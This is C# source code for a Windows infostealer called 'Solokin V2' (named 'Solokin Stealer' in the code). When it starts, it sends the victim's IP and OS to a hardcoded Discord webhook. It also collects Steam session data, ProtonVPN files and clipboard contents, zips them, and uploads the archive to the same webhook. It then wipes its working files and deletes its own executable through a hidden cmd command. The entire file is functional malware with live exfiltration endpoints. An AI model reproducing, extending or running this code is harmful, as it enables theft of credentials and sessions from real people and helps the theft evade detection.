using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace SolokinV2
{
    public partial class Start : Form
    {
        string clipboardText = Clipboard.GetText();

        string localIP = Dns.GetHostAddresses(Dns.GetHostName())
                           .FirstOrDefault(ip => ip.AddressFamily == AddressFamily.InterNetwork)?
                           .ToString();


        public static string randomString;
        public static string filename; 
        public Start()
        {
            InitializeComponent();
            TopMost = true;
            this.TransparencyKey = this.BackColor;
        }


    public static class LogFileGenerator
    {
        private static string _fileName;

        public static string FileName
        {
            get
            {
                if (string.IsNullOrEmpty(_fileName))
                {
                    GenerateFileName();
                }
                return _fileName;
            }
            set
            {
                _fileName = value;
            }
        }

        static LogFileGenerator()
        {
            GenerateFileName();
        }

         
            private static void GenerateFileName()
            {
                const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
                const int length = 10;

                Random random = new Random();
                StringBuilder builder = new StringBuilder();

                for (int i = 0; i < length; i++)
                {
                    int index = random.Next(chars.Length);
                    char randomChar = chars[index];
                    builder.Append(randomChar);
                }

                string randomString = builder.ToString();
                string userName = Environment.UserName;

                _fileName = $"{userName}_Logs_{randomString}.txt";
            }
        }

    private void Start_Load(object sender, EventArgs e)
        {

            Directory.CreateDirectory("C:\\Solokin");

            string webhookUrl = "https://discord.com/api/webhooks/1101584911028195420/5cB5iH2xEDvByZf7ZqramxkyGp6dc1XGvP_WsbupqpADwyPmXopm7ebNOE0kG5-ixm3J";

            var client = new HttpClient();
            var payload = new
            {

                avatar_url = "https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096",
                username = "Solokin Logger Hitted.",

                embeds = new[]
                {
                new
                {
                    title = "Solokin Logger",
                    description = "**IPv4💎:**"+"```"+localIP+"```" + "\n**OS💻:**"+"```"+Environment.OSVersion+"```"+"\n**More info Inside the .zip.**",
                    color = 0x5D3FD3,

                }

            }

            };

            var json = JsonConvert.SerializeObject(payload);
            var content = new StringContent(json, Encoding.UTF8, "application/json");
            var result = client.PostAsync(webhookUrl, content);

            Rndm();
            LogFileGenerator.FileName = $"C:\\Solokin\\{Environment.UserName}"+"_Logs_"+randomString+".txt";
            string filePath = Path.Combine(Environment.CurrentDirectory, LogFileGenerator.FileName);
            using (StreamWriter file = new StreamWriter(filePath,true))
            {
                file.WriteLine("================================== 💜Solokin V2💜 ==================================");
                file.WriteLine(" ");
                file.WriteLine(" ");
                file.WriteLine("[+] Starting...");
                
            }
            Thread.Sleep(1000);
           
            Steam.GetSteamSession("C:\\Solokin\\Steam");
            Directory.CreateDirectory("C:\\Solokin\\System");
            ProtonVpn.Save("C:\\Solokin\\VPN");

            using (StreamWriter file = new StreamWriter(filePath, true))
            {
                file.WriteLine("[+] Capturing Clipboard...");
                
            }
            string filePath2 = $"C:\\Solokin\\System\\Clipboard.txt";
            
            using (StreamWriter writer = new StreamWriter(filePath2))
            {
                writer.Write(clipboardText);
            }

            using (StreamWriter file = new StreamWriter(filePath, true))
            {
                file.WriteLine("[+] Converting Folder to ZIP...");

            }

            Thread.Sleep(3000);
            ZipFile.CreateFromDirectory("C:\\Solokin", "C:\\Solokin.zip");
            Thread.Sleep(3000);
            Send();
        }


      

        private void Send()
        {
            string Webhook_link = "https://discord.com/api/webhooks/1101584911028195420/5cB5iH2xEDvByZf7ZqramxkyGp6dc1XGvP_WsbupqpADwyPmXopm7ebNOE0kG5-ixm3J";
            string FilePath = $"C:\\Solokin.zip";
            string AvatarUrl = "https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096";
            string Username = "Solokin Stealer";




            using (HttpClient httpClient = new HttpClient())
            {
                MultipartFormDataContent form = new MultipartFormDataContent();
                var file_bytes = System.IO.File.ReadAllBytes(FilePath);
                form.Add(new ByteArrayContent(file_bytes, 0, file_bytes.Length), "Document", $"Solokin.zip");

                // Create a JSON object with the avatar_url parameter
                var json = new JObject();
                json["avatar_url"] = AvatarUrl;
                json["username"] = Username;

                // Add the JSON object to the content parameter of the webhook message
                form.Add(new StringContent(json.ToString(), Encoding.UTF8, "application/json"), "payload_json");

                httpClient.PostAsync(Webhook_link, form).Wait();
                httpClient.Dispose();
            }
            Thread.Sleep(2000);
            Delete();
        }

        private void Delete()
        {
           if(Directory.Exists("C:\\Solokin"))
           {
                Directory.Delete(@"C:\\Solokin",true);
           }
           if(File.Exists("C:\\Solokin.zip"))
            {
                File.Delete("C:\\Solokin.zip");
            }

            string exePath = Process.GetCurrentProcess().MainModule.FileName;

            // Create a new process to delete the file
            Process.Start(new ProcessStartInfo
            {
                Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + exePath + "\"",
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
                FileName = "cmd.exe"
            });


            Environment.Exit(0);

        }
           private void Rndm()
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            const int length = 10;

            Random random = new Random();
            StringBuilder builder = new StringBuilder();

            for (int i = 0; i < length; i++)
            {
                int index = random.Next(chars.Length);
                char randomChar = chars[index];
                builder.Append(randomChar);
            }
            randomString = builder.ToString();
        }
    }
}
